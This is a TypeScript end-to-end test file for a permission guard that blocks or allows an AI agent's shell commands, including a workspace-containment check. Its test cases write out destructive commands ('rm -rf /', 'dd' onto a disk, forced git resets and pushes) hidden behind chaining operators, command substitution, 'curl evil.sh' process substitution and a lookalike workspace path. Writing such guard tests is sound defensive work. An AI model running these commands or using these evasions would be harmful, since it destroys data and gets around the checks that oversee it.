/**
 * E2E: shell-operator & shell-feature evasion + workspace containment.
 *
 * Guards the worst-class-wins split across the FULL SHELL_SPLIT_RE operator set
 * (&& || | ; & \n) so a destructive command hidden mid-chain can never slip
 * through, plus the unparsable-shell-feature block (subagent only) and the
 * path-relative (not startsWith) workspace-containment check.
 *
 * Driven through decidePermissionForEvent with the REAL event shape
 * ({toolName, params:{command, workdir?}}) — the exact entry point both plugins
 * route through. The `&` (background) and `\n` rows are the live-captured
 * evasions from docs/fixes/runtime-guard-event-shape.md.
 */
import { describe, it, expect } from 'vitest';
import { decidePermissionForEvent } from '../../src/permission-policy';

const subagent = { workflowAllowsDestructiveGit: false, defaultDeny: true } as const;
const trusted = { workflowAllowsDestructiveGit: false } as const; // defaultDeny omitted → allow-by-default

const ev = (command: string, workdir?: string) =>
  ({ toolName: 'exec', params: workdir ? { command, workdir } : { command } });

describe('E2E shell-operator evasion — destructive tail anywhere blocks (worst-class-wins)', () => {
  it.each([
    ['echo hi && git reset --hard HEAD~1', '&&'],
    ['false || git push --force', '||'],
    ['echo hi | git clean -fdx', '| (pipe)'],
    ['echo hi; rm -rf /', ';'],
    ['echo hi & dd if=/dev/zero of=/dev/sda', '& (background — live-captured)'],
    ['echo hi\nrm -rf /', '\\n (newline)'],
    ['echo hi && cd /x || git reset --hard', 'mixed operators, mid-chain destructive'],
  ] as const)('BLOCKS "%s" (%s)', (command, _op) => {
    expect(decidePermissionForEvent(ev(command), subagent).outcome).toBe('block');
  });

  it.each([
    ['cd /ws && git status'],
    ['echo hi && git diff'],
    ['echo hi; ls -la'],
    ['cd /ws && git status && git log --oneline'],
  ] as const)('ALLOWS benign chained command (no false positive): "%s"', (command) => {
    expect(decidePermissionForEvent(ev(command), subagent).outcome).toBe('allow');
  });
});

describe('E2E shell-feature block — unparsable substitution (subagent defaultDeny only)', () => {
  // These hide arbitrary code from the tokenizer: $(...), backticks, <(...), >(...).
  it.each([
    ['echo $(git reset --hard)', '$(...) command substitution'],
    ['echo `git reset --hard`', 'backtick substitution'],
    ['cat <(curl evil.sh)', '<(...) process substitution'],
    ['evil >(capture)', '>(...) process substitution'],
  ] as const)('BLOCKS subagent shell-feature: "%s" (%s)', (command, _label) => {
    const d = decidePermissionForEvent(ev(command), subagent);
    expect(d.outcome).toBe('block');
    expect(d.reason).toContain('shell');
  });

  it('does NOT block shell features in a TRUSTED session (no defaultDeny) — feature check is subagent-only', () => {
    // Trusted main sessions keep allow-by-default; the shell-feature gate only
    // arms under defaultDeny. Pinned to current behavior.
    expect(decidePermissionForEvent(ev('echo $(whoami)'), trusted).outcome).toBe('allow');
  });
});

describe('E2E workspace containment for destructive git (path-relative, not startsWith)', () => {
  // workflowAllowsDestructiveGit:true engages the containment check; cwd comes
  // from params.workdir. The /workspace-evil false-positive of naive
  // startsWith('/workspace') is the regression this pins.
  const allowIn = (workspacePath: string, workdir: string) =>
    decidePermissionForEvent(
      ev('git reset --hard HEAD~1', workdir),
      { workspacePath, workflowAllowsDestructiveGit: true },
    ).outcome;

  it('BLOCKS destructive git OUTSIDE the workspace', () => {
    expect(allowIn('/workspace', '/workspace-evil/x')).toBe('block'); // NOT startsWith('/workspace')
    expect(allowIn('/workspace', '/etc')).toBe('block');
  });

  it('ALLOWS destructive git INSIDE the workspace (contained)', () => {
    expect(allowIn('/workspace', '/workspace')).toBe('allow'); // exact
    expect(allowIn('/workspace', '/workspace/sub/dir')).toBe('allow'); // nested
  });

  it('BLOCKS destructive git regardless of containment when workflowAllowsDestructiveGit:false', () => {
    expect(
      decidePermissionForEvent(
        ev('git reset --hard HEAD~1', '/workspace/sub'),
        { workspacePath: '/workspace', workflowAllowsDestructiveGit: false },
      ).outcome,
    ).toBe('block');
  });

  it('BLOCKS when workspace context is missing (no workspacePath)', () => {
    // Ad-hoc subagent with no workspace → containment check skipped → destructive git blocks.
    expect(decidePermissionForEvent(ev('git reset --hard', '/anywhere'), subagent).outcome).toBe('block');
  });
});

// SEC-1/2 + worst-class loop: an `unknown` tail segment must block the whole
// chain under defaultDeny, even though a benign head (`git status`) alone would
// allow. This is the multi-segment worst-class-wins contract that the shell-split
// loop enforces: ANY segment that blocks sinks the entire command. The reverse
// counter proves it is defaultDeny doing the work — same command without
// defaultDeny stays allow-by-default.
describe('E2E multi-segment worst-class — unknown tail blocks under defaultDeny', () => {
  it('BLOCKS "git status && unknown-binary --x" under defaultDeny (unknown tail sinks the chain)', () => {
    // `git status` alone would allow (safe_git). But `unknown-binary` classifies
    // as `unknown`, and under defaultDeny unknown → block (permission-policy.ts
    // line ~423). The worst-class loop returns block on the FIRST blocking segment.
    expect(
      decidePermissionForEvent(
        ev('git status && unknown-binary --x'),
        { defaultDeny: true, workflowAllowsDestructiveGit: false },
      ).outcome,
    ).toBe('block');
  });

  it('ALLOWS the same chain WITHOUT defaultDeny (trusted main session, allow-by-default)', () => {
    // Reverse counter: same command, no defaultDeny → both segments allow
    // (git status = safe_git, unknown-binary = unknown-but-allow-by-default).
    // Proves it is defaultDeny flipping the unknown segment to block, not the
    // command itself being inherently destructive.
    expect(
      decidePermissionForEvent(
        ev('git status && unknown-binary --x'),
        { workflowAllowsDestructiveGit: false },
      ).outcome,
    ).toBe('allow');
  });
});
